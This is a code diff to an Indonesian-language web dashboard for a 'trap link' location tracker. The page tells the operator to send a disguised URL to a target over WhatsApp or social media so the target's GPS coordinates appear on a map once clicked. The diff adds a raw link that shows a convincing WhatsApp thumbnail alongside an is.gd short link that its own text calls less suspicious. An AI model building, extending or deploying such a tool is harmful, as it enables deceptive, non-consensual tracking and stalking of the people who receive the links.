@@ -460,15 +460,34 @@
                             GPS Satelit (Akurat)</div>
                     </div>
 
-                    <p style="font-size:0.9rem; color:var(--text-dim);">Kirim URL jebakan di bawah ini ke target. Jangan
-                        tutup halaman ini, kalo diklik koordinat akan muncul otomatis!</p>
+                    <p style="font-size:0.9rem; color:var(--text-dim); margin-bottom:1.5rem;">Pilih jenis link jebakan
+                        di bawah ini. Jangan tutup halaman ini!</p>
 
+                    <div style="font-size: 0.8rem; color: var(--success); margin-bottom: 5px; font-weight: bold;">
+                        <i data-lucide="image" style="width:14px; vertical-align:middle; margin-right: 5px;"></i>TIPE 1:
+                        MUNCUL THUMBNAIL ASLI (RAW)
+                    </div>
                     <div
                         style="display:flex; justify-content:center; align-items:stretch; gap: 10px; margin-bottom: 15px;">
+                        <div class="trap-linkbox" id="displayTrapLinkRaw"
+                            style="flex: 1; margin: 0; text-align: left; display: flex; align-items: center; padding-left: 15px; font-size: 0.75rem;"
+                            title="Link Jebakan Raw"></div>
+                        <button onclick="copyRawLink()" title="Copy Link Raw"
+                            style="background: var(--success); color: #000; border: none; border-radius: 8px; cursor: pointer; padding: 0 20px; font-weight: bold; display: flex; align-items: center; justify-content: center; transition: all 0.3s ease;">
+                            <i data-lucide="copy" style="width:20px;"></i>
+                        </button>
+                    </div>
+
+                    <div style="font-size: 0.8rem; color: var(--primary); margin-bottom: 5px; font-weight: bold;">
+                        <i data-lucide="eye-off" style="width:14px; vertical-align:middle; margin-right: 5px;"></i>TIPE
+                        2: LINK PENDEK BIASA (IS.GD)
+                    </div>
+                    <div
+                        style="display:flex; justify-content:center; align-items:stretch; gap: 10px; margin-bottom: 25px;">
                         <div class="trap-linkbox" id="displayTrapLink"
-                            style="flex: 1; margin: 0; text-align: left; display: flex; align-items: center; padding-left: 15px;"
-                            title="Link Jebakan"></div>
-                        <button onclick="copyTrapLink()" title="Copy Link"
+                            style="flex: 1; margin: 0; text-align: left; display: flex; align-items: center; padding-left: 15px; font-size: 0.75rem;"
+                            title="Link Jebakan Pendek"></div>
+                        <button onclick="copyTrapLink()" title="Copy Link Pendek"
                             style="background: var(--primary); color: #000; border: none; border-radius: 8px; cursor: pointer; padding: 0 20px; font-weight: bold; display: flex; align-items: center; justify-content: center; transition: all 0.3s ease;">
                             <i data-lucide="copy" style="width:20px;"></i>
                         </button>
@@ -584,6 +603,7 @@
                 switchTab('panelTracker', document.querySelector('.tab[onclick*="panelTracker"]'));
                 document.getElementById('setupView').style.display = 'none';
                 document.getElementById('dashboardView').style.display = 'block';
+                document.getElementById('displayTrapLinkRaw').innerText = "Hanya memantau, tidak ada link jebakan";
                 document.getElementById('displayTrapLink').innerText = "📡 MONITORING MODE: " + urlTopic;
                 initMap();
                 listenToDashboard(urlTopic);
@@ -591,10 +611,12 @@
             }
 
             const savedTopic = localStorage.getItem('sintel_topic');
+            const savedTrapLinkRaw = localStorage.getItem('sintel_trap_link_raw');
             const savedTrapLink = localStorage.getItem('sintel_trap_link');
             if (savedTopic && savedTrapLink) {
                 document.getElementById('setupView').style.display = 'none';
                 document.getElementById('dashboardView').style.display = 'block';
+                if (savedTrapLinkRaw) document.getElementById('displayTrapLinkRaw').innerText = savedTrapLinkRaw;
                 document.getElementById('displayTrapLink').innerText = savedTrapLink;
                 initMap();
                 listenToDashboard(savedTopic);
@@ -613,6 +635,7 @@
         function resetTracker() {
             localStorage.removeItem('sintel_topic');
             localStorage.removeItem('sintel_trap_link');
+            localStorage.removeItem('sintel_trap_link_raw');
             if (eventSource) eventSource.close();
 
             if (map) {
@@ -623,6 +646,7 @@
 
             document.getElementById('setupView').style.display = 'block';
             document.getElementById('dashboardView').style.display = 'none';
+            document.getElementById('displayTrapLinkRaw').innerText = '';
             document.getElementById('displayTrapLink').innerText = '';
             document.getElementById('logsContainer').innerHTML = '';
         }
@@ -684,19 +708,26 @@
 
             // Save state
             localStorage.setItem('sintel_topic', topicId);
+            localStorage.setItem('sintel_trap_link_raw', rawLink);
             localStorage.setItem('sintel_trap_link', trapLink);
 
             document.getElementById('setupView').style.display = 'none';
             document.getElementById('dashboardView').style.display = 'block';
+            document.getElementById('displayTrapLinkRaw').innerText = rawLink;
             document.getElementById('displayTrapLink').innerText = trapLink;
 
             initMap();
             listenToDashboard(topicId);
         }
 
+        function copyRawLink() {
+            navigator.clipboard.writeText(document.getElementById('displayTrapLinkRaw').innerText);
+            alert("Link RAW Copied! Muncul thumbnail asli jika dikirim ke WA.");
+        }
+
         function copyTrapLink() {
             navigator.clipboard.writeText(document.getElementById('displayTrapLink').innerText);
-            alert("Copied! Tempel & Kirim ke WhatsApp/Sosmed target.");
+            alert("Link Pendek Copied! Lebih tidak mencurigakan tapi tanpa thumbnail WA.");
         }
 
         function listenToDashboard(topic) {
